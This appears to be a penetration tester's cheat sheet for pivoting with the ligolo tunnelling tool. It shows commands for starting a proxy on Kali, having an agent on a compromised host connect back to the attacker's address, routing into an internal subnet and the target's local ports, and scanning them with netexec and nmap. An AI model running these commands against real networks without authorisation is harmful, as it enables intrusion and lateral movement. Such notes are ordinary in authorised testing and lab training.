# Pivoting into a new network:

kali - setup listener:
```
./proxy -selfcert
ifcreate --name ligolo
```

linux/windows target - connect back to kali:
```
.\agent.exe -connect 10.0.0.12:11601 -ignore-cert
```

kali - configure interface, route, and starting tunnel from ligolo proxy:
```
session
ifconfig
ifcreate --name ligolo
route_add --name ligolo --route 10.0.2.0/24
iflist
start --tun ligolo
```

confirm its working:
```
netexec smb 10.0.2.0/24
nmap -Pn -v 10.0.2.0/24 --open
```
# Reach local ports on target host:

kali - setup listener:
```
./proxy -selfcert
ifcreate --name ligolo
```

linux/windows target - connect back to kali:
```
.\agent.exe -connect 10.0.0.12:11601 -ignore-cert
```

kali - configure interface, route, and starting tunnel:
```
session
ifcreate --name ligolo
route_add --name ligolo --route 240.0.0.1/32
iflist
start --tun ligolo
```

confirm its working:
```
netexec smb 240.0.0.1/32
nmap -Pn -v 240.0.0.1/32 --open
```

